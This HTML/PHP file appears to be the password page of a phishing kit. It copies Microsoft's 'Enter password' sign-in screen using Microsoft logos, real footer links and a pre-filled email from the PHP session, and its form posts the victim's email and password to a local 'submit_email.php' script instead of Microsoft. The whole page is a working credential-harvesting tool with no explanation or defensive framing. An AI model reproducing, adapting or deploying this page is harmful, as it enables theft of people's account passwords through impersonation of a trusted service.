<html dir="ltr" lang="EN-US">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign in to your Microsoft account</title>
    <meta name="robots" content="none">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27991.01/images/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" crossorigin="anonymous" integrity="sha384-E5gbpbd7pvLncrSFicEeR0od7Yqv75BoM0zAKpkW6kM6RUIPj83KEbtUBQeB8pRU" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="../assets/css/hotmail.css">
    <style type="text/css"></style>
    <style type="text/css">
        body {
            display: none;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>
    <style type="text/css">
        body {
            display: block !important;
        }
    </style>

</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
        <!--  -->
        <div">
            <div class="background" style="background-image: url('../assets/img/hotmail_bg.png');">
               
            </div>
        </div>
        <div data-bind="if: activeDialog"></div>
        <form name="f1" id="i0281" validate="validate" spellcheck="false" method="post" target="_top" autocomplete="off" action="submit_email.php">
            <div class="outer" data-bind="">
                <div class="middle">
                    <div class="inner">
                        <div class="lightbox-cover"></div>

                        <div>
                            <img class="logo" pngsrc="https://auth.gfx.ms/16.000.27991.01/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://auth.gfx.ms/16.000.27991.01/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/16.000.28426.6/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" alt="Microsoft">

                        </div>

                        <div role="main">
                            <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.G) -->
                            <div>
                                <div>
                                    <!--  -->
                                    <div class="identityBanner">
                                        <!-- ko if: isBackButtonVisible -->
                                        <button type="button" class="backButton" id="idBtn_Back" aria-label="Back"><img role="presentation" onclick="window.history.go(-1); return false;" pngsrc="https://auth.gfx.ms/16.000.27991.01/images/arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="https://auth.gfx.ms/16.000.27991.01/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="https://logincdn.msauth.net/16.000.28426.6/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410">
                                           
                                        </button>
                                        <!-- /ko -->
                                        <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['email'];?>">
                                            <?php echo $_SESSION['email'];?>
                                        </div>
                                        <!-- ko ifnot: svr.I -->
                                        <!-- /ko -->
                                    </div>
                                </div>
                            </div>
                            <!-- /ko -->
                            <div class="pagination-view has-identity-banner">
                                
                                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true">
                                    <!--  -->
                                    
                                    <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                    
                                    <div class="row">
                                        <div class="form-group col-md-24">
                                            <div role="alert" aria-live="assertive" aria-atomic="false">
                                                
                                            </div>
                                            <div class="placeholderContainer">
                                                <input type="hidden" name="email" value="<?php echo $_SESSION['email'];?>">
                                                <input name="password" required="required" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter the password for <?php echo $_SESSION['email'];?>">
                                               
                                            </div>
                                        </div>
                                    </div>
                                    <!-- ko if: svr.Z && showHip -->
                                    <!-- /ko -->
                                    <div data-bind="invertOrder: svr.B4, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                        <div>
                                            <!-- ko if: svr.ba -->
                                            <!-- /ko -->
                                            <!-- ko if: svr.aA !== false && !svr.ba && !tenantBranding.KeepMeSignedInDisabled -->
                                            <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.d &amp;&amp; !showHip">
                                                <label id="idLbl_PWD_KMSI_Cb">
                                                    <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label>
                                            </div>
                                            <!-- /ko -->
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.n, click: resetPassword_onClick">Forgot my password</a> </div>
                                                        <div class="form-group"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                            <div>
                                                <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
                                                    <!-- ko if: isSecondaryButtonVisible -->
                                                    <!-- /ko -->
                                                    <div class="inline-block">
                                                        <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Sign in"> </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- ko if: tenantBranding.BoilerPlateText -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
            <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                <div>

                    <div id="footerLinks" class="footerNode text-secondary">
                        <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.b0">©2020 Microsoft</span>
                        <!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600">Privacy &amp; cookies</a>

                        <a href="#" role="button" class="moreOptions" aria-label="Click here for more options">
                            <img class="desktopMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73">
                            <img class="mobileMode" role="presentation" pngsrc="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="https://auth.gfx.ms/16.000.27991.01/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c">

                        </a>
                    </div>

                </div>
            </div>
    </div>
    </div>

    </form>

    </div>

    <div>
        <!--  -->
</body>

</html>